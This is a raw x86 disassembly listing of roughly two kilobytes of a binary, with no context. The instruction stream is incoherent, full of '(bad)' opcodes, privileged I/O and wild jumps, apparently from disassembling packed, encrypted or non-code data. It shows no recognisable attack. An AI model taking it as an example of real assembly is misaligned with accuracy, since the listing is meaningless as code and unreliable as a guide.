  428b75:	outs   dx,DWORD PTR ds:[esi]
  428b76:	lods   eax,DWORD PTR ds:[esi]
  428b77:	popa   
  428b78:	push   edx
  428b79:	push   ebp
  428b7a:	lds    ebp,FWORD PTR [ebp-0x3f]
  428b7d:	hlt    
  428b7e:	jnp    0x428b25
  428b80:	dec    ecx
  428b81:	xchg   DWORD PTR [edi],ebp
  428b83:	pop    ecx
  428b84:	cdq    
  428b85:	div    esi
  428b87:	cmp    DWORD PTR [ebp-0x3f],edx
  428b8a:	je     0x428bef
  428b8c:	dec    edi
  428b8d:	mov    esi,0x13cdad6d
  428b92:	push   ecx
  428b93:	pop    esi
  428b94:	pop    ecx
  428b95:	add    ecx,ebp
  428b97:	add    BYTE PTR [edx],dh
  428b99:	inc    esp
  428b9a:	jne    0x428ba1
  428b9c:	push   esi
  428b9d:	stos   DWORD PTR es:[edi],eax
  428b9e:	stc    
  428b9f:	fcomp  QWORD PTR [ebp+0x2ce940ea]
  428ba5:	mov    esi,esp
  428ba7:	in     eax,dx
  428ba8:	lods   al,BYTE PTR ds:[esi]
  428ba9:	popf   
  428baa:	and    al,0xd9
  428bac:	sbb    dh,BYTE PTR [eax-0x5dd0b8a7]
  428bb2:	mov    esi,0xbf61e5
  428bb7:	xchg   esi,eax
  428bb8:	adc    edi,DWORD PTR [ecx]
  428bba:	outs   dx,DWORD PTR ds:[esi]
  428bbb:	and    eax,0x7114445e
  428bc0:	push   esp
  428bc1:	cdq    
  428bc2:	add    BYTE PTR [esi-0x5a],dh
  428bc5:	lock sar BYTE PTR [esi-0x62],0x88
  428bca:	cmp    BYTE PTR [ebp+0x62],0x47
  428bce:	cli    
  428bcf:	jmp    0x587e188
  428bd4:	outs   dx,BYTE PTR ds:[esi]
  428bd5:	test   eax,0x9cadad8b
  428bda:	push   eax
  428bdb:	bound  edx,QWORD PTR [edi]
  428bdd:	sbb    al,0x45
  428bdf:	add    BYTE PTR [edi-0x2b],ch
  428be2:	sub    BYTE PTR [eax],al
  428be4:	retf   
  428be5:	fdivr  st(5),st
  428be7:	adc    eax,0x40eedb
  428bec:	ds popf 
  428bee:	jae    0x428bfe
  428bf0:	push   ss
  428bf1:	sub    DWORD PTR [esi],ebx
  428bf3:	inc    eax
  428bf4:	add    bh,cl
  428bf6:	add    BYTE PTR [eax],al
  428bf8:	jnp    0x428bde
  428bfa:	ret    
  428bfb:	add    BYTE PTR ss:[ebp-0xc],dl
  428bff:	push   ebx
  428c00:	push   esi
  428c01:	fadd   st(7),st
  428c03:	cmp    esp,DWORD PTR [ebp+ecx*4+0x1c]
  428c07:	cli    
  428c08:	mov    esp,0xdd97
  428c0d:	into   
  428c0e:	dec    edi
  428c0f:	lock (bad) 
  428c11:	iret   
  428c12:	sub    dh,dh
  428c14:	add    BYTE PTR [ebx-0x24],cl
  428c17:	dec    esi
  428c18:	push   eax
  428c19:	xor    al,0xab
  428c1b:	jns    0x428be1
  428c1d:	daa    
  428c1e:	rol    DWORD PTR [esp+0xdc23],0x5b
  428c26:	(bad)  
  428c27:	lods   al,BYTE PTR ds:[esi]
  428c28:	and    al,0xf7
  428c2a:	fild   DWORD PTR [eax]
  428c2c:	add    ah,dh
  428c2e:	call   0xdd8d9f5b
  428c33:	add    eax,0x6e
  428c36:	inc    edi
  428c37:	push   ebp
  428c38:	lea    edi,[edi+0x28]
  428c3b:	test   BYTE PTR [eax],0xfb
  428c3e:	fndisi(8087 only) 
  428c40:	or     al,0x53
  428c42:	(bad)  
  428c44:	dec    DWORD PTR [ebx]
  428c46:	rol    DWORD PTR [esp+0xdd0b],0x4d
  428c4e:	sub    eax,0x848d7f7
  428c53:	or     eax,0x96284f8d
  428c58:	add    BYTE PTR [edx+0x32],ah
  428c5b:	(bad)  
  428c5c:	mov    eax,0xfffe31a5
  428c61:	add    dl,cl
  428c63:	jle    0x428c55
  428c65:	stc    
  428c66:	mov    ch,0xb4
  428c68:	leave  
  428c69:	and    edi,DWORD PTR [edx-0x37]
  428c6c:	sbb    eax,0x16326200
  428c71:	push   ecx
  428c72:	push   esp
  428c73:	add    BYTE PTR [edi],ah
  428c75:	lea    ebx,[esi]
  428c77:	push   ds
  428c78:	(bad)  
  428c79:	dec    edi
  428c7a:	ffreep st(5)
  428c7c:	fstp   DWORD PTR [edi-0x1801cd9e]
  428c82:	out    dx,al
  428c83:	popa   
  428c84:	sub    bl,bh
  428c86:	out    0x6d,eax
  428c88:	fisub  DWORD PTR [edi]
  428c8a:	stos   DWORD PTR es:[edi],eax
  428c8b:	sar    ch,1
  428c8d:	jmp    DWORD PTR [edx-0x47]
  428c90:	mov    ecx,0xd7288223
  428c95:	xor    DWORD PTR [eax+ebp*1+0x72],edx
  428c99:	inc    esp
  428c9a:	xchg   BYTE PTR [eax-0x32],cl
  428c9d:	arpl   WORD PTR gs:[esi],cx
  428ca0:	jb     0x428c26
  428ca2:	xchg   BYTE PTR [eax+0x5],ch
  428ca5:	add    BYTE PTR [edx+0x59],ah
  428ca8:	add    eax,DWORD PTR [eax]
  428caa:	bound  esi,QWORD PTR [eax+0xcdb50d4]
  428cb0:	loope  0x428cd9
  428cb2:	jmp    0x428cc0
  428cb4:	loope  0x428ce1
  428cb6:	jmp    0x428ca4
  428cb8:	loopne 0x428cdd
  428cba:	or     eax,0xa20ff646
  428cbf:	xor    BYTE PTR [ebx-0x40],bh
  428cc2:	ja     0x428cfd
  428cc4:	jae    0x428d0a
  428cc6:	add    BYTE PTR [esi],bh
  428cc8:	and    dh,cl
  428cca:	push   ecx
  428ccb:	(bad)  
  428ccd:	loopne 0x428cfe
  428ccf:	xlat   BYTE PTR ds:[ebx]
  428cd0:	in     al,0xe0
  428cd2:	pop    ds
  428cd3:	retf   0x3d9
  428cd6:	rcr    ebx,cl
  428cd8:	inc    esi
  428cd9:	outs   dx,DWORD PTR ds:[esi]
  428cda:	mov    al,0x81
  428cdc:	jmp    0x1187921f
  428ce1:	dec    ebx
  428ce2:	test   DWORD PTR [edx-0x20f543ba],edi
  428ce8:	sbb    DWORD PTR [esi+ecx*1+0x5bdaf12],esi
  428cef:	xlat   BYTE PTR ds:[ebx]
  428cf0:	lods   eax,DWORD PTR ds:[esi]
  428cf1:	add    esp,esp
  428cf3:	cmp    dh,BYTE PTR [ecx]
  428cf5:	dec    edi
  428cf6:	sti    
  428cf7:	(bad)  
  428cf8:	fldcw  WORD PTR [esi+0x3a]
  428cfb:	jp     0x428cb6
  428cfd:	jbe    0x428d03
  428cff:	bound  edx,QWORD PTR [edx-0x5c]
  428d02:	fist   WORD PTR [ecx+0x54]
  428d05:	pushf  
  428d06:	fistp  QWORD PTR ds:0x62040680
  428d0c:	fldenv [eax-0x40]
  428d0f:	inc    ecx
  428d10:	std    
  428d11:	push   DWORD PTR [ebp-0x69]
  428d14:	inc    edi
  428d15:	jecxz  0x428d8d
  428d17:	fdivp  st(4),st
  428d19:	fild   WORD PTR [ebx]
  428d1b:	(bad)  
  428d1c:	fnstcw WORD PTR [esp+edx*8]
  428d1f:	mov    edi,0x81cf5cdb
  428d24:	in     eax,0x20
  428d26:	sbb    al,0xbb
  428d28:	shr    al,1
  428d2a:	add    eax,DWORD PTR [eax]
  428d2c:	fistp  WORD PTR [ebx+ecx*1+0x17d1bfe4]
  428d33:	sahf   
  428d34:	pop    ds
  428d35:	push   ebp
  428d36:	cmp    al,0xe0
  428d38:	jne    0x428cda
  428d3a:	(bad)  
  428d3b:	mov    eax,ds:0x76e7d85a
  428d40:	sahf   
  428d41:	std    
  428d42:	sbb    ebp,DWORD PTR [ecx]
  428d44:	jbe    0x428d43
  428d46:	fld    TBYTE PTR [eax]
  428d48:	outs   dx,BYTE PTR ds:[esi]
  428d49:	std    
  428d4a:	rcl    ebx,cl
  428d4c:	ficomp WORD PTR [eax+eax*1+0x6695f5cd]
  428d53:	lods   eax,DWORD PTR ds:[esi]
  428d54:	mov    dh,0x3d
  428d56:	fst    DWORD PTR [edi+0x61]
  428d59:	fnstcw WORD PTR [ebp+0x25]
  428d5c:	pop    ecx
  428d5d:	push   eax
  428d5e:	inc    ebp
  428d5f:	or     eax,0xac5aa25a
  428d64:	out    0x40,al
  428d66:	add    ah,al
  428d68:	lods   eax,DWORD PTR ds:[esi]
  428d69:	pop    esi
  428d6a:	into   
  428d6b:	add    BYTE PTR [esi+0x49e900d9],0xac
  428d72:	xor    ebp,DWORD PTR [edi]
  428d74:	dec    edx
  428d75:	scas   al,BYTE PTR es:[edi]
  428d76:	jg     0x428da5
  428d78:	xchg   ebp,eax
  428d79:	inc    ebx
  428d7a:	cli    
  428d7b:	jmp    0x569438a6
  428d80:	mov    edi,edx
  428d82:	add    cl,ch
  428d84:	xchg   edx,eax
  428d85:	pop    esi
  428d86:	lock xchg ecx,eax
  428d88:	or     esp,eax
  428d8a:	inc    eax
  428d8b:	jmp    0x9556d023
  428d90:	add    BYTE PTR [ebx-0x67],dl
  428d93:	add    BYTE PTR [edx+0x54],ah
  428d96:	xor    DWORD PTR [edi+0x2d],ebp
  428d99:	pop    esi
  428d9a:	inc    esp
  428d9b:	or     eax,0x98ea25
  428da0:	push   0xffffffa2
  428da2:	aad    0x25
  428da4:	lahf   
  428da5:	mov    eax,0x37f92fdd
  428daa:	fwait
  428dab:	dec    ecx
  428dac:	xor    al,0x7d
  428dae:	mov    al,ds:0x5c13aa5a
  428db3:	in     eax,dx
  428db4:	push   0xe8fdd17a
  428db9:	popa   
  428dba:	push   esi
  428dbb:	test   BYTE PTR [ecx+0x3ffa4044],ah
  428dc1:	adc    eax,0x3762f75c
  428dc6:	test   eax,0x46f300b6
  428dcb:	cli    
  428dcc:	jmp    DWORD PTR [edx-0x4bf844b]
  428dd2:	loopne 0x428de4
  428dd4:	pushf  
  428dd5:	dec    ebp
  428dd6:	cld    
  428dd7:	adc    DWORD PTR [edi],0xfef95a4e
  428ddd:	sub    al,0xfc
  428ddf:	push   eax
  428de0:	mov    edi,DWORD PTR [ebp-0x1b]
  428de3:	inc    esi
  428de4:	jae    0x428e12
  428de6:	cld    
  428de7:	mov    ebp,0xdacb07
  428dec:	add    BYTE PTR [esi-0x63],al
  428def:	je     0x428e19
  428df1:	ds ret 0xfef8
  428df5:	add    BYTE PTR [esp+edi*8+0x4f],cl
  428df9:	push   edi
  428dfa:	adc    BYTE PTR [ebp-0xebc7275],ch
  428e00:	cmc    
  428e01:	jmp    DWORD PTR [ebx-0x22]
  428e04:	push   0xffffffff
  428e06:	ins    BYTE PTR es:[edi],dx
  428e07:	pop    ecx
  428e08:	shl    DWORD PTR [esp+ebp*2-0x41],0xd
  428e0d:	(bad)  
  428e0e:	(bad)  
  428e0f:	hlt    
  428e10:	cld    
  428e11:	jmp    FWORD PTR [eax+eiz*8-0x6b]
  428e15:	xchg   edx,eax
  428e16:	dec    ebx
  428e17:	fsub   st,st(1)
  428e19:	add    bh,BYTE PTR [eax-0x63]
  428e1c:	push   ebp
  428e1d:	pop    esi
  428e1e:	adc    dl,BYTE PTR [edi+0x5d1f8b53]
  428e24:	in     eax,dx
  428e25:	or     BYTE PTR [edx-0x28],cl
  428e28:	add    BYTE PTR [ebp-0x90f3a],cl
  428e2e:	in     al,dx
  428e2f:	adc    eax,0xbee98b4f
  428e34:	not    DWORD PTR [eax-0x6f]
  428e37:	inc    eax
  428e38:	add    BYTE PTR [eax],al
  428e3a:	or     esi,DWORD PTR [ebp-0x22c48248]
  428e40:	call   0x2409f0e8
  428e45:	sti    
  428e46:	out    dx,eax
  428e47:	mov    esp,0x5af5fa25
  428e4c:	into   
  428e4d:	xchg   BYTE PTR [edi+eax*8],dl
  428e50:	xor    ch,al
  428e52:	add    eax,DWORD PTR [eax+0x23]
  428e55:	sti    
  428e56:	out    0x71,eax
  428e58:	stos   BYTE PTR es:[edi],al
  428e59:	sbb    al,0x0
  428e5b:	jmp    0xdfcf84e4
  428e60:	mov    ecx,0x80c5fb23
  428e65:	and    esi,DWORD PTR [ebp+0x6e]
  428e68:	mov    bh,0x35
  428e6a:	call   0xfb660ee1
  428e6f:	out    0xf1,al
  428e71:	test   eax,0xbdf27104
  428e76:	out    0x60,al
  428e78:	aas    
  428e79:	ds pop ebx
  428e7b:	xor    al,0x9
  428e7d:	inc    eax
  428e7e:	or     BYTE PTR [edx-0x4f],ah
  428e81:	adc    DWORD PTR [ebx+eiz*2],esi
  428e84:	xor    bh,dh
  428e86:	dec    esi
  428e87:	pop    ss
  428e88:	mov    ebx,cs
  428e8a:	mov    esp,0xfffe314e
  428e8f:	pop    ss
  428e90:	push   0xffffffb6
  428e92:	jnp    0x428eb6
  428e94:	xor    bh,BYTE PTR [ecx+0x44]
  428e97:	xchg   BYTE PTR [eax-0x37a77932],al
  428e9d:	inc    ebp
  428e9e:	ret    
  428e9f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428ea0:	fdivr  st(4),st
  428ea2:	mov    al,ds:0xe80de90f
  428ea7:	xor    eax,0x710004c2
  428eac:	pop    esi
  428ead:	lock enter 0xfcd8,0xf8
  428eb2:	and    esi,DWORD PTR [edx-0xc]
  428eb5:	adc    BYTE PTR [eax],ch
  428eb7:	mov    ds:0x1b7f3e3f,eax
  428ebc:	(bad)  
  428ebe:	hlt    
  428ebf:	add    BYTE PTR [ecx+0x2ee92611],ah
  428ec5:	enter  0x9a7d,0x62
  428ec9:	push   esp
  428eca:	sbb    al,0xe0
  428ecc:	dec    ebp
  428ecd:	xor    DWORD PTR [edi],ebp
  428ecf:	(bad)  
  428ed0:	(bad)  
  428ed1:	fldenv [esi-0x60]
  428ed4:	inc    ecx
  428ed5:	stc    
  428ed6:	out    0xd2,eax
  428ed8:	out    dx,al
  428ed9:	popf   
  428eda:	ret    
  428edb:	xlat   BYTE PTR ds:[ebx]
  428edc:	and    eax,0x69dfb454
  428ee1:	xor    DWORD PTR [esp+ebx*4+0x446c42c8],edx
  428ee8:	ss xchg edi,eax
  428eea:	pop    esp
  428eeb:	mov    eax,0x324fed81
  428ef0:	cmp    al,BYTE PTR [edx+0x3b]
  428ef3:	jns    0x428ea7
  428ef5:	pop    esp
  428ef6:	cmp    ah,BYTE PTR [esi-0x51d601b4]
  428efc:	dec    eax
  428efd:	out    dx,al
  428efe:	and    ebp,ecx
  428f00:	sbb    al,0x54
  428f02:	lods   al,BYTE PTR ds:[esi]
  428f03:	fild   QWORD PTR [ecx+0x31]
  428f06:	dec    ecx
  428f07:	(bad)  
  428f08:	(bad)  
  428f09:	fldenv [ebx+0x44]
  428f0c:	out    dx,al
  428f0d:	loop   0x428ea7
  428f0f:	int    0xde
  428f11:	fstp   st(2)
  428f13:	rcl    esi,cl
  428f15:	xchg   ebp,eax
  428f16:	retf   
  428f17:	jecxz  0x428f5e
  428f19:	aam    0x80
  428f1b:	and    al,0x59
  428f1d:	pop    ebp
  428f1e:	test   al,0xaf
  428f20:	fs push esp
  428f22:	sub    al,0xe0
  428f24:	add    BYTE PTR [ecx+0x31],dh
  428f27:	cmp    bl,BYTE PTR [eax+edi*1-0x190740be]
  428f2e:	xchg   esp,eax
  428f2f:	or     edx,DWORD PTR [eax]
  428f31:	cmp    cl,BYTE PTR [esi+0x629254f]
  428f37:	add    DWORD PTR [edi+0x545552c],edi
  428f3d:	cmp    bh,BYTE PTR [eax+eax*1+0x64ec4739]
  428f44:	mul    DWORD PTR [ecx]
  428f46:	inc    edx
  428f47:	jg     0x428ef6
  428f49:	cmc    
  428f4a:	pop    edx
  428f4b:	ret    
  428f4c:	cs sbb al,0xa5
  428f4f:	push   ebp
  428f50:	push   0xe9000d2d
  428f55:	popa   
  428f56:	add    BYTE PTR [eax+0xd77185],0xe9
  428f5d:	mov    dl,0xa7
  428f5f:	test   DWORD PTR [edx+edi*2],ebx
  428f62:	jmp    0xbbd978a7
  428f67:	and    al,0xc3
  428f69:	popa   
  428f6a:	ds xor al,0xa1
  428f6d:	(bad)  
  428f6e:	xchg   ebp,eax
  428f6f:	add    BYTE PTR [ebx+0x18],dh
  428f72:	shl    DWORD PTR ds:[ecx+eiz*1-0x33],cl
  428f77:	or     ah,BYTE PTR [edx+0x59]
  428f7a:	xor    esp,edi
  428f7c:	jns    0x428fbd
  428f7e:	ds sahf 
  428f80:	icebp  
  428f81:	(bad)  
  428f82:	xchg   ebp,eax
  428f83:	add    BYTE PTR [edx],dl
  428f85:	xchg   dl,al
  428f87:	and    esp,ecx
  428f89:	add    dh,al
  428f8b:	xchg   ebp,eax
  428f8c:	add    cl,ch
  428f8e:	loop   0x428f93
  428f90:	or     DWORD PTR [esi-0x1105be53],eax
  428f96:	in     eax,0xdd
  428f98:	(bad)  
  428f99:	call   0x7d7409ff
  428f9e:	adc    eax,0x71c9a941
  428fa3:	fld    DWORD PTR [eax]
  428fa5:	out    dx,al
  428fa6:	fst    st(4)
  428fa8:	(bad)  
  428fa9:	call   0xe144020f
  428fae:	popa   
  428faf:	fnstenv [eax+eax*1+0x2d]
  428fb3:	jne    0x428f67
  428fb5:	add    DWORD PTR [ebx],edi
  428fb7:	frstor [edx+0x0]
  428fba:	aam    0x22
  428fbc:	inc    edx
  428fbd:	jg     0x428ffe
  428fbf:	aad    0xf5
  428fc1:	(bad)  
  428fc2:	jle    0x428f59
  428fc4:	je     0x428fd5
  428fc6:	in     al,0x22
  428fc8:	jmp    0xe3c8:0x81d54f72
  428fcf:	cs cmp al,0x0
  428fd2:	sti    
  428fd3:	out    dx,eax
  428fd4:	cli    
  428fd5:	xor    bh,BYTE PTR [ebx-0x2bf7ebb0]
  428fdb:	sbb    dl,bh
  428fdd:	mov    al,BYTE PTR [ebx]
  428fdf:	out    dx,al
  428fe0:	xor    BYTE PTR [esi+0x309ffc44],al
  428fe6:	xchg   edi,eax
  428fe7:	sbb    dl,bh
  428fe9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428fea:	imul   esp,DWORD PTR [ecx+0x8],0xffffff8d
  428fee:	add    bh,dl
  428ff0:	cmp    BYTE PTR [edx],cl
  428ff2:	call   0x388a00
  428ff7:	fisub  DWORD PTR ds:0xad8b4466
  428ffd:	add    BYTE PTR [ecx],al
  428fff:	mov    ebx,esp
  429001:	je     0x42901e
  429003:	test   al,0x9c
  429005:	push   eax
  429006:	push   ecx
  429007:	adc    dl,ch
  429009:	or     BYTE PTR [edi-0x31],bh
  42900c:	fcom   QWORD PTR [eax+0x68]
  42900f:	cmc    
  429010:	mov    bh,0x3a
  429012:	add    bl,cl
  429014:	hlt    
  429015:	push   ds
  429016:	mov    cl,0x65
  429018:	sti    
  429019:	lahf   
  42901a:	xor    bh,ah
  42901c:	pop    ss
  42901d:	cli    
  42901e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42901f:	or     ebp,DWORD PTR [eax+0x5a]
  429022:	push   0x57
  429024:	outs   dx,BYTE PTR ds:[esi]
  429025:	cli    
  429026:	(bad)  
  429027:	outs   dx,BYTE PTR ds:[esi]
  429028:	or     eax,0x32624477
  42902d:	pop    ds
  42902e:	shl    ch,cl
  429030:	lds    esp,FWORD PTR [ebx+0x40]
  429033:	bound  ebp,QWORD PTR [ebp-0x4ca98bc3]
  429039:	popf   
  42903a:	pop    es
  42903b:	bound  edi,QWORD PTR [ecx+0x36a2c1d5]
  429041:	(bad)  
  429042:	out    0x60,al
  429044:	and    edi,DWORD PTR [esi]
  429046:	xchg   DWORD PTR [edi+0x4a],ebp
  429049:	lahf   
  42904a:	inc    ebx
  42904b:	bound  edi,QWORD PTR [ebx-0x4ade17bb]
  429051:	push   ds
  429052:	sti    
  429053:	add    BYTE PTR [eax+0x46],bh
  429056:	lods   al,BYTE PTR ds:[esi]
  429057:	jmp    esp
  429059:	test   dh,al
  42905b:	jp     0x429083
  42905d:	xor    bl,BYTE PTR [edi]
  42905f:	rcr    bh,cl
  429061:	jno    0x428ff5
  429063:	or     esp,ecx
  429065:	adc    DWORD PTR [esi],eax
  429067:	add    bl,bl
  429069:	stc    
  42906a:	inc    esi
  42906b:	inc    eax
  42906c:	xor    WORD PTR [ebx],bp
  42906f:	(bad)  
  429070:	jo     0x429064
  429072:	mov    dl,BYTE PTR ds:0xffc2175a
  429078:	fmul   DWORD PTR [ecx]
  42907a:	es cwde 
  42907c:	out    0x6,eax
  42907e:	pop    ds
  42907f:	mov    eax,ds:0xffc27e52
  429084:	loope  0x429077
  429086:	pushf  
  429087:	add    al,0x7a
  429089:	pop    ebx
  42908a:	pop    edx
  42908b:	sti    
  42908c:	jge    0x42903b
  42908e:	cmp    dh,BYTE PTR [edi+eax*2-0x7f]
  429092:	mov    ecx,DWORD PTR ds:0xffc2575a
  429098:	jge    0x429101
  42909a:	push   ebp
  42909b:	cli    
  42909c:	pop    ebp
  42909d:	mov    esp,0x74d507d8
  4290a2:	inc    BYTE PTR [esp+edx*2-0x2306a426]
  4290a9:	(bad)  
  4290ab:	xor    cl,BYTE PTR [ecx]
  4290ad:	inc    eax
  4290ae:	ror    DWORD PTR [ebp-0x42d660d8],cl
  4290b4:	loop   0x4290cb
  4290b6:	fmul   DWORD PTR [ecx]
  4290b8:	add    BYTE PTR [edx-0x27],ah
  4290bb:	rcl    BYTE PTR [esi-0x17],1
  4290be:	(bad)  
  4290c0:	sar    BYTE PTR [ebx+0x724868a2],0xd7
  4290c7:	out    0x3,eax
  4290c9:	lds    esp,FWORD PTR [esi+ebp*2-0x1bd21cd0]
  4290d0:	add    eax,0xc75cd962
  4290d5:	jmp    0x92f6aa84
  4290da:	push   edx
  4290db:	jbe    0x4290b3
  4290dd:	mov    ah,0x3e
  4290df:	frstor [edi-0x7918669b]
  4290e5:	mov    ds:0xc8b8dbc5,al
  4290ea:	les    ebx,FWORD PTR [ebx+0x61]
  4290ed:	data16 fsub st,st(7)
  4290f0:	add    ecx,DWORD PTR [edx-0x2f]
  4290f3:	xchg   ah,al
  4290f5:	lods   eax,DWORD PTR ds:[esi]
  4290f6:	dec    ebp
  4290f7:	ins    DWORD PTR es:[edi],dx
  4290f8:	sbb    BYTE PTR [edi+0x2db93b3e],ah
  4290fe:	xor    ebx,esi
  429100:	sub    al,0x62
  429102:	fldenv [esi+0x48]
  429105:	jb     0x42915b
  429107:	sub    BYTE PTR [edx-0x789357e3],ah
  42910d:	jbe    0x42914b
  42910f:	adc    esp,DWORD PTR [ecx]
  429111:	adc    dh,BYTE PTR [ecx-0x26dd9a99]
  429117:	outs   dx,BYTE PTR ds:[esi]
  429118:	xor    al,0xab
  42911a:	(bad)  
  42911c:	add    eax,DWORD PTR [eax]
  42911e:	loop   0x429150
  429120:	add    DWORD PTR [edx+0x64fa4026],ebp
  429126:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429127:	lds    esp,FWORD PTR ds:0x7542696a
  42912d:	pop    es
  42912e:	in     eax,dx
  42912f:	push   ebx
  429130:	cmc    
  429131:	aam    0x82
  429133:	inc    edx
  429134:	push   ecx
  429135:	into   
  429136:	xor    al,0x86
  429138:	push   cs
  429139:	sub    DWORD PTR [esi+0x4c],ebx
  42913c:	test   BYTE PTR [ebp+0x1efa427c],dh
  429142:	fmul   DWORD PTR [ebp-0x307e2b07]
  429148:	inc    eax
  429149:	jmp    0x9e8cde67
  42914e:	push   ds
  42914f:	push   ss
  429150:	pop    ss
  429151:	mov    dl,0x43
  429153:	jle    0x42914f
  429155:	adc    al,0x42
  429157:	inc    edx
  429158:	adc    al,0xe5
  42915a:	out    dx,al
  42915b:	std    
  42915c:	add    BYTE PTR [esi],bl
  42915e:	mov    al,ds:0x2912be53
  429163:	jle    0x4291b9
  429165:	bound  edi,QWORD PTR [ebp-0x42]
  429168:	in     al,0x61
  42916a:	idiv   DWORD PTR [esi]
  42916c:	pop    ecx
  42916d:	push   ecx
  42916e:	es dec ebx
  429170:	cli    
  429171:	push   esi
  429172:	fstp   QWORD PTR [eax]
  429174:	jne    0x42916f
  429176:	xchg   edi,eax
  429177:	adc    cl,ch
  429179:	dec    edx
  42917a:	inc    esp
  42917b:	inc    edx
  42917c:	cli    
  42917d:	push   ecx
  42917e:	mov    al,ds:0x36fb19
  429183:	xor    eax,ebx
  429185:	in     eax,0xeb
  429187:	mov    bh,0x7d
  429189:	xchg   BYTE PTR [esp+eax*8],cl
  42918c:	jle    0x429177
  42918e:	cmp    al,BYTE PTR [edx+0x42]
  429191:	cli    
  429192:	ins    DWORD PTR es:[edi],dx
  429193:	and    ebp,eax
  429195:	sub    BYTE PTR [ebx+0x144261],al
  42919b:	pop    DWORD PTR [ebx+0x3a]
  42919e:	add    al,dl
  4291a0:	nop
  4291a1:	mov    eax,0xd8f14d
  4291a6:	data16 adc bl,al
  4291a9:	jae    0x4291bf
  4291ab:	rcl    BYTE PTR [esi],1
  4291ad:	sbb    DWORD PTR ss:[edi-0x33],0xd94b4550
  4291b5:	jae    0x4291bf
  4291b7:	rcl    BYTE PTR [ecx],0x2
  4291ba:	sub    BYTE PTR [eax],bh
  4291bc:	xchg   esi,eax
  4291bd:	cmc    
  4291be:	loopne 0x4291d8
  4291c0:	cdq    
  4291c1:	mov    ecx,0xf5dcace8
  4291c6:	dec    DWORD PTR [eax]
  4291c8:	cdq    
  4291c9:	mov    edx,0x8381fb04
  4291ce:	in     al,dx
  4291cf:	mov    BYTE PTR [ecx],cl
  4291d1:	imul   edx,DWORD PTR [ebx+0x35],0x950fd327
  4291d8:	call   0xe9b2943f
  4291dd:	mov    bl,0xa4
  4291df:	sub    BYTE PTR ds:0xbd768cfa,dl
  4291e5:	call   0xdc959263
  4291ea:	cmc    
  4291eb:	lea    ecx,[esi]
  4291ed:	shr    eax,0x55
  4291f0:	adc    ebx,ebx
  4291f2:	cmc    
  4291f3:	test   BYTE PTR [ebx-0x7074df9e],cl
  4291f9:	mov    eax,ds:0xd8fba3a4
  4291fe:	bound  eax,QWORD PTR [ecx]
  429200:	push   cs
  429201:	adc    BYTE PTR [edx-0xa1f1018],0xff
  429208:	sub    dl,BYTE PTR cs:[edx-0x90f7c18]
  42920f:	inc    DWORD PTR [edi]
  429211:	xchg   ebp,eax
  429212:	jae    0x42921d
  429214:	(bad)  
  429215:	in     al,0x3d
  429217:	sub    BYTE PTR [ecx+0x35],0x90
  42921b:	mov    ebx,0x14e3079
  429220:	mov    esp,0xafbf4d77
  429225:	mov    bh,0x30
  429227:	jg     0x42926f
  429229:	dec    edx
  42922a:	push   esi
  42922b:	sub    BYTE PTR [ebx+0x32],dh
  42922e:	(bad)  
  42922f:	out    0x43,eax
  429231:	mov    ebp,0xf5ea0004
  429236:	call   0xb348233d
  42923b:	push   edx
  42923c:	jno    0x4292b0
  42923e:	mov    ch,0x86
  429240:	outs   dx,DWORD PTR ds:[esi]
  429241:	add    dh,BYTE PTR [ecx-0x4e4a9dbd]
  429247:	and    edi,DWORD PTR [edx]
  429249:	mov    edx,0x680023c1
  42924e:	push   0x1a
  429250:	test   al,0xfc
  429252:	pop    edx
  429253:	add    al,0x6e
  429256:	adc    eax,0x1a464487
  42925b:	xchg   DWORD PTR [esi+edi*1+0xe],ecx
  42925f:	xchg   ecx,eax
  429260:	push   esp
  429261:	xchg   BYTE PTR [edx],bh
  429263:	lea    eax,[esi+edi*2+0x2a]
  429267:	es push edi
  429269:	leave  
  42926a:	stos   BYTE PTR es:[edi],al
  42926b:	sbb    al,BYTE PTR [edi-0x790331b2]
  429271:	mov    edx,0xb58544de
  429276:	mov    ah,0xc9
  429278:	and    eax,DWORD PTR [esi-0x45103de5]
  42927e:	and    eax,0xa69dfa6d
  429283:	add    eax,0xfcce0e87
  429288:	xchg   BYTE PTR [esi],cl
  42928a:	(bad)  
  42928b:	in     al,0x80
  42928d:	test   al,bl
  42928f:	adc    DWORD PTR [edx+eiz*2],eax
  429292:	fldl2e 
  429294:	mov    BYTE PTR [esi-0x26],al
  429297:	out    0x3,eax
  429299:	in     eax,0xb
  42929b:	add    BYTE PTR [edx+edi*8+0x2287e7d8],dl
  4292a2:	retf   
  4292a3:	arpl   WORD PTR [ecx+0x54],si
  4292a6:	cmp    ebp,eax
  4292a8:	shl    BYTE PTR [edi+edx*4],cl
  4292ab:	xchg   esi,eax
  4292ac:	nop
  4292ad:	scas   al,BYTE PTR es:[edi]
  4292ae:	cmc    
  4292af:	dec    ebx
  4292b0:	pop    ebx
  4292b1:	add    BYTE PTR [edx-0x18],dh
  4292b4:	ja     0x429292
  4292b6:	cmp    eax,0x291ddb6d
  4292bb:	dec    ebp
  4292bc:	and    al,0xe8
  4292be:	test   DWORD PTR [ecx-0x525653ea],ebp
  4292c4:	and    eax,DWORD PTR [ecx+ebx*1]
  4292c7:	in     eax,0x8b
  4292c9:	repnz dec ebp
  4292cb:	fstp   DWORD PTR [esi+0x14]
  4292ce:	fild   WORD PTR [ebx-0xd]
  4292d1:	xchg   DWORD PTR [edi-0x6fc1829],eax
  4292d7:	in     al,0x2b
  4292d9:	repnz sub eax,0x6254ccd9
  4292df:	(bad)  
  4292e1:	xchg   esi,eax
  4292e2:	mov    fs:0xe7edf77a,eax
  4292e8:	daa    
  4292e9:	add    al,0x7d
  4292eb:	daa    
  4292ec:	pop    edi
  4292ed:	adc    bl,bh
  4292ef:	inc    ebx
  4292f0:	xrelease xchg DWORD PTR [edi],esp
  4292f3:	xlat   BYTE PTR ds:[ebx]
  4292f4:	out    0x3,eax
  4292f6:	retf   0xdff7
  4292f9:	add    ah,BYTE PTR [edx+0x71]
  4292fc:	or     BYTE PTR [eax-0x2c0aa9a0],bl
  429302:	or     DWORD PTR [ebp+0x4de6f3e7],edx
  429308:	add    DWORD PTR ds:0xe900d932,ecx
  42930e:	cmp    edi,edi
  429310:	or     al,ch
  429312:	popa   
  429313:	push   ebp
  429314:	rcl    DWORD PTR [eax+eax*1-0x3272b256],0x61
  42931c:	cmp    bh,dl
